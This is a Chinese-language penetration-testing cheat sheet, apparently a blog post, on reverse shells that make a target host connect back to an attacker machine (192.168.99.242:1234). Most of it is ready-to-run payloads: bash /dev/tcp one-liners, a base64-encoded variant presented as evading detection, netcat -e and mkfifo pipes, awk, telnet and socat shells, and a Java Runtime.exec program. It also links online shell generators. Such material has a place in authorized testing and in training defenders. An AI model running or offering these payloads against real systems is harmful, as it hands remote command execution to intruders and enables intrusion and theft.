<h2 class="md-end-block md-heading"><span class="md-plain">一、什么是反弹 Shell？</span></h2>
<p class="md-end-block md-p"><span class="md-plain">在渗透测试中，当目标主机因防火墙限制、端口过滤等原因导致无法直接连接时，</span><span class="md-pair-s "><strong><span class="md-plain">反弹 Shell</span></strong></span><span class="md-plain"> 技术可让目标主机主动向攻击者控制的主机发起连接，从而建立交互式命令行会话。这是内网渗透中突破网络限制、获取持续控制权限的核心手段。</span></p>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">基础环境约定</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者主机 IP：</span><span class="md-pair-s" spellcheck="false"><code>192.168.99.242</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者监听端口：</span><span class="md-pair-s" spellcheck="false"><code>1234</code></span><span class="md-plain">（特殊场景会单独说明）</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">二、Linux 系统反弹 Shell 姿势</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">1. bash 原生反弹</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">原理</span></h4>
<p class="md-end-block md-p"><span class="md-plain">利用 bash 的重定向功能，将标准输入、输出、错误绑定到 TCP 连接，实现交互式 Shell。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">命令示例</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">基础版</span></strong></span><span class="md-plain">：</span></p>



```bash
bash -i >& /dev/tcp/192.168.99.242/1234 0>&1
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>bash -i</code></span><span class="md-plain">：启动交互式 bash</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>&gt;&amp; /dev/tcp/...</code></span><span class="md-plain">：将输出重定向到 TCP 连接</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>0&gt;&amp;1</code></span><span class="md-plain">：将标准输入绑定到标准输出（实现双向通信）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">在线工具：<a href="https://www.ddosi.org/shell/">反弹shell命令在线生成器|🔰雨苁🔰</a></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Base64 编码版</span></strong></span><span class="md-plain">（规避特殊字符检测）：</span></p>



```bash
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">在线编码工具：</span><span class="md-link md-pair-s" spellcheck="false"><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">变体（适用于特殊环境）</span></strong></span><span class="md-plain">：</span></p>



```bash
# 方法1：通过文件描述符维持连接
exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5;done
​
# 方法2：直接绑定标准流
exec /bin/sh 0</dev/tcp/192.168.99.242/1234 1>&0 2>&0
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2. netcat（nc）反弹</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">原理</span></h4>
<p class="md-end-block md-p"><span class="md-plain">利用 netcat 的 </span><span class="md-pair-s" spellcheck="false"><code>-e</code></span><span class="md-plain"> 参数直接将 Shell 绑定到 TCP 连接。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">命令示例</span></h4>


```bash
nc -e /bin/bash 192.168.99.242 1234
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注：部分 nc 版本不支持</span><span class="md-pair-s" spellcheck="false"><code>-e</code></span><span class="md-plain">参数，需替换为管道方式：</span></p>



```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.99.242 1234 >/tmp/f
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3. awk 反弹</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">原理</span></h4>
<p class="md-end-block md-p"><span class="md-plain">利用 awk 的网络编程能力建立 TCP 连接并绑定 Shell。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">命令示例</span></h4>


```bash
awk 'BEGIN{
  s="/inet/tcp/0/192.168.99.242/1234";
  for(;s|&getline c;close(c)) while(c|getline) print|&s;
  close(s)
}'
```


<h3 class="md-end-block md-heading"><span class="md-plain">4. telnet 反弹</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">原理</span></h4>
<p class="md-end-block md-p"><span class="md-plain">通过两个 telnet 连接分别传输命令和结果（需攻击者监听两个端口）。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">操作步骤</span></h4>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者同时监听 1234（输入）和 4321（输出）：</span></p>



```bash
nc -lvp 1234  # 终端1：接收命令输入
nc -lvp 4321  # 终端2：显示命令结果
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">目标机执行反弹命令：</span></p>



```bash
telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321
```


</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">5. socat 反弹</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">原理</span></h4>
<p class="md-end-block md-p"><span class="md-plain">通过 socat 工具建立带伪终端的 TCP 连接，支持更稳定的交互式 Shell。</span></p>

<h4 class="md-end-block md-heading"><span class="md-plain">命令示例</span></h4>


```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">优势：伪终端（pty）支持命令补全、信号传递（如 Ctrl+C）。</span></p>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">7. Java 反弹</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">步骤</span></h4>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">编写 Java 代码（Revs.java）：</span></p>



```java
public class Revs {
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[] = {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">编译并执行：</span></p>



```bash
javac Revs.java && java Revs
```
